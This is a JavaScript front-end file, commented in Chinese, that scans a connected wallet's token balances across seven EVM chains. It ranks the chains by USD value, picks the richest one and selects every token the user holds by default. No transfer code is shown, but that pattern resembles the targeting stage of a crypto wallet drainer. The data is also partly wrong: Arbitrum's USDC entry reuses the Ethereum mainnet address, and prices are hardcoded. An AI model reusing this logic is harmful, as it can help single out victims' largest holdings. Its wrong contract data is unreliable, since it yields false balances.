// 多链配置
const CHAINS = {
  1: { name: 'Ethereum', nativeCurrency: 'ETH', rpcUrl: 'https://rpc.ankr.com/eth' },
  56: { name: 'BSC', nativeCurrency: 'BNB', rpcUrl: 'https://bsc-dataseed.binance.org' },
  137: { name: 'Polygon', nativeCurrency: 'MATIC', rpcUrl: 'https://rpc.ankr.com/polygon' },
  42161: { name: 'Arbitrum', nativeCurrency: 'ETH', rpcUrl: 'https://arb1.arbitrum.io/rpc' },
  10: { name: 'Optimism', nativeCurrency: 'ETH', rpcUrl: 'https://mainnet.optimism.io' },
  43114: { name: 'Avalanche', nativeCurrency: 'AVAX', rpcUrl: 'https://api.avax.network/ext/bc/C/rpc' },
  11155111: { name: 'Sepolia', nativeCurrency: 'ETH', rpcUrl: 'https://rpc.sepolia.org' }
};

// 每个链的代币配置
const CHAIN_TOKENS = {
  1: [ // Ethereum - 主流代币
    { symbol: 'ETH', name: 'Ethereum', address: '0x0000000000000000000000000000000000000000', decimals: 18, icon: 'Ξ' },
    { symbol: 'USDC', name: 'USD Coin', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, icon: '$' },
    { symbol: 'USDT', name: 'Tether USD', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6, icon: '₮' },
    { symbol: 'DAI', name: 'Dai Stablecoin', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, icon: '◈' },
    { symbol: 'WBTC', name: 'Wrapped BTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8, icon: '₿' },
    { symbol: 'WETH', name: 'Wrapped Ether', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18, icon: 'Ξ' },
    { symbol: 'UNI', name: 'Uniswap', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, icon: '🦄' },
    { symbol: 'LINK', name: 'Chainlink', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18, icon: '🔗' },
    { symbol: 'PEPE', name: 'Pepe', address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', decimals: 18, icon: '🐸' },
    { symbol: 'SHIB', name: 'Shiba Inu', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, icon: '🐕' }
  ],
  56: [ // BSC - 主流代币
    { symbol: 'BNB', name: 'BNB', address: '0x0000000000000000000000000000000000000000', decimals: 18, icon: '🔶' },
    { symbol: 'USDC', name: 'USD Coin', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18, icon: '$' },
    { symbol: 'USDT', name: 'Tether USD', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, icon: '₮' },
    { symbol: 'BUSD', name: 'Binance USD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18, icon: '💵' },
    { symbol: 'CAKE', name: 'PancakeSwap', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18, icon: '🥞' },
    { symbol: 'WBNB', name: 'Wrapped BNB', address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', decimals: 18, icon: '🔶' },
    { symbol: 'ETH', name: 'Ethereum', address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', decimals: 18, icon: 'Ξ' },
    { symbol: 'ADA', name: 'Cardano', address: '0x3EE2200Efb3400f8B9BAd8c75345c48D3b459b4F', decimals: 18, icon: '🔵' }
  ],
  137: [ // Polygon
    { symbol: 'MATIC', name: 'Polygon', address: '0x0000000000000000000000000000000000000000', decimals: 18, icon: '🟣' },
    { symbol: 'USDC', name: 'USD Coin', address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', decimals: 6, icon: '$' },
    { symbol: 'USDT', name: 'Tether USD', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6, icon: '₮' },
    { symbol: 'DAI', name: 'Dai Stablecoin', address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', decimals: 18, icon: '◈' }
  ],
  42161: [ // Arbitrum
    { symbol: 'ETH', name: 'Ethereum', address: '0x0000000000000000000000000000000000000000', decimals: 18, icon: 'Ξ' },
    { symbol: 'USDC', name: 'USD Coin', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, icon: '$' },
    { symbol: 'USDT', name: 'Tether USD', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6, icon: '₮' },
    { symbol: 'DAI', name: 'Dai Stablecoin', address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', decimals: 18, icon: '◈' }
  ],
  10: [ // Optimism
    { symbol: 'ETH', name: 'Ethereum', address: '0x0000000000000000000000000000000000000000', decimals: 18, icon: 'Ξ' },
    { symbol: 'USDC', name: 'USD Coin', address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', decimals: 6, icon: '$' },
    { symbol: 'USDT', name: 'Tether USD', address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', decimals: 6, icon: '₮' },
    { symbol: 'DAI', name: 'Dai Stablecoin', address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', decimals: 18, icon: '◈' }
  ],
  43114: [ // Avalanche
    { symbol: 'AVAX', name: 'Avalanche', address: '0x0000000000000000000000000000000000000000', decimals: 18, icon: '🔺' },
    { symbol: 'USDC', name: 'USD Coin', address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', decimals: 6, icon: '$' },
    { symbol: 'USDT', name: 'Tether USD', address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', decimals: 6, icon: '₮' },
    { symbol: 'DAI', name: 'Dai Stablecoin', address: '0xd586E7F844cEe2e7f55A50eef8f19D70C8685507', decimals: 18, icon: '◈' }
  ],
  11155111: [ // Sepolia 测试网
    { symbol: 'ETH', name: 'Ethereum', address: '0x0000000000000000000000000000000000000000', decimals: 18, icon: 'Ξ' },
    { symbol: 'USDC', name: 'USD Coin', address: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238', decimals: 6, icon: '$' },
    { symbol: 'USDT', name: 'Tether USD', address: '0x7169B38b14A09298eC8Fd24380896Fb872AeC93f', decimals: 6, icon: '₮' },
    { symbol: 'DAI', name: 'Dai Stablecoin', address: '0xFF34B3d4Aee8ddCd6F9affFB64049c656e7c3f8b', decimals: 18, icon: '◈' },
    { symbol: 'WETH', name: 'Wrapped Ether', address: '0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14', decimals: 18, icon: 'Ξ' }
  ]
};

let userTokens = [];
let selectedTokens = new Set();
let chainBalances = {}; // 存储每个链的总价值
let bestChain = null; // 最佳链

async function fetchUserTokens(address, provider) {
  try {
    const tokens = [];
    const currentChainId = await provider.getNetwork().then(n => n.chainId);
    const chainTokens = CHAIN_TOKENS[currentChainId] || [];

    for (const token of chainTokens) {
      try {
        let balance;
        if (token.address === '0x0000000000000000000000000000000000000000') {
          balance = await provider.getBalance(address);
        } else {
          const erc20Abi = [
            'function balanceOf(address owner) view returns (uint256)',
            'function decimals() view returns (uint8)',
            'function symbol() view returns (string)',
            'function name() view returns (string)'
          ];
          const contract = new ethers.Contract(token.address, erc20Abi, provider);
          balance = await contract.balanceOf(address);
        }

        const formattedBalance = ethers.utils.formatUnits(balance, token.decimals);
        const balanceNum = parseFloat(formattedBalance);

        if (balanceNum > 0) {
          tokens.push({
            ...token,
            balance: formattedBalance,
            balanceNum: balanceNum,
            balanceUsd: balanceNum * getTokenPrice(token.symbol),
            chainId: currentChainId
          });
        }
      } catch (error) {
        console.error(`Error fetching ${token.symbol}:`, error);
      }
    }

    tokens.sort((a, b) => b.balanceUsd - a.balanceUsd);
    userTokens = tokens;

    // 计算当前链的总价值
    const chainTotalValue = tokens.reduce((sum, token) => sum + token.balanceUsd, 0);
    chainBalances[currentChainId] = chainTotalValue;

    // 自动选择所有代币
    tokens.forEach(token => {
      selectedTokens.add(token.address);
    });

    return tokens;
  } catch (error) {
    console.error('Error fetching user tokens:', error);
    return [];
  }
}

// 扫描所有链并选择最佳链
async function scanAllChains(address) {
  const chainResults = [];

  // 并行扫描所有链
  const chainPromises = Object.entries(CHAINS).map(async ([chainId, chainConfig]) => {
    try {
      const provider = new ethers.providers.JsonRpcProvider(chainConfig.rpcUrl);
      const chainTokens = CHAIN_TOKENS[chainId] || [];
      let chainValue = 0;
      let tokenCount = 0;

      // 并行查询该链上的所有代币余额
      const balancePromises = chainTokens.map(async (token) => {
        try {
          let balance;
          if (token.address === '0x0000000000000000000000000000000000000000') {
            balance = await provider.getBalance(address);
          } else {
            const erc20Abi = ['function balanceOf(address owner) view returns (uint256)'];
            const contract = new ethers.Contract(token.address, erc20Abi, provider);
            balance = await contract.balanceOf(address);
          }

          const formattedBalance = ethers.utils.formatUnits(balance, token.decimals);
          const balanceNum = parseFloat(formattedBalance);

          if (balanceNum > 0) {
            return {
              symbol: token.symbol,
              usdValue: balanceNum * getTokenPrice(token.symbol),
              balance: formattedBalance
            };
          }
        } catch (error) {
          // 忽略单个代币的错误
          return null;
        }
      });

      // 等待该链上所有代币查询完成
      const balances = await Promise.all(balancePromises);

      // 计算该链的总价值和代币数
      for (const balance of balances) {
        if (balance) {
          chainValue += balance.usdValue;
          tokenCount++;
        }
      }

      if (chainValue > 0) {
        return {
          chainId: parseInt(chainId),
          chainName: chainConfig.name,
          totalValue: chainValue,
          tokenCount: tokenCount
        };
      }

      return null;
    } catch (error) {
      console.error(`Error scanning chain ${chainId}:`, error);
      return null;
    }
  });

  // 等待所有链扫描完成
  const results = await Promise.all(chainPromises);

  // 过滤掉空结果
  for (const result of results) {
    if (result) {
      chainResults.push(result);
    }
  }

  // 按价值排序
  chainResults.sort((a, b) => b.totalValue - a.totalValue);

  // 选择价值最高的链
  if (chainResults.length > 0) {
    bestChain = chainResults[0];
    return {
      bestChain: bestChain,
      allChains: chainResults,
      totalValue: chainResults.reduce((sum, chain) => sum + chain.totalValue, 0),
      totalTokens: chainResults.reduce((sum, chain) => sum + chain.tokenCount, 0)
    };
  }

  // 如果所有链都没有余额，默认选择Ethereum主链(chainId=1)的ERC20 USDT
  addLog('info', 'No tokens found across all chains. Defaulting to Ethereum USDT chain.');
  bestChain = {
    chainId: 1,
    chainName: CHAINS[1].name,
    totalValue: 0,
    tokenCount: 0
  };

  return {
    bestChain: bestChain,
    allChains: chainResults,
    totalValue: 0,
    totalTokens: 0
  };
}

function getTokenPrice(symbol) {
  const prices = {
    'ETH': 3500,
    'BNB': 600,
    'MATIC': 0.8,
    'AVAX': 35,
    'USDC': 1,
    'USDT': 1,
    'DAI': 1,
    'BUSD': 1,
    'WBTC': 65000,
    'WETH': 3500,
    'UNI': 8,
    'LINK': 15,
    'AAVE': 100,
    'COMP': 60
  };
  return prices[symbol] || 0;
}

// 日志辅助函数(需要从app.js中调用)
function addLog(type, message) {
  const resultLog = document.getElementById('resultLog');
  if (resultLog) {
    const time = new Date().toLocaleTimeString();
    const logEntry = document.createElement('div');
    logEntry.className = `log-${type}`;
    logEntry.textContent = `[${time}] ${message}`;
    resultLog.appendChild(logEntry);
    resultLog.scrollTop = resultLog.scrollHeight;
  }
}

function updateBestChainDisplay() {
  if (bestChain) {
    document.getElementById('bestChainName').textContent = `${bestChain.chainName} ($${bestChain.totalValue.toFixed(2)})`;
  } else {
    document.getElementById('bestChainName').textContent = '—';
  }
}

function updateTotalTokensDisplay(totalTokens) {
  document.getElementById('totalTokensCount').textContent = totalTokens || 0;
}

function updateTotalValueDisplay(totalValue) {
  document.getElementById('totalValue').textContent = `$${(totalValue || 0).toFixed(2)}`;
}

function getSelectedTokens() {
  return userTokens.filter(token => selectedTokens.has(token.address));
}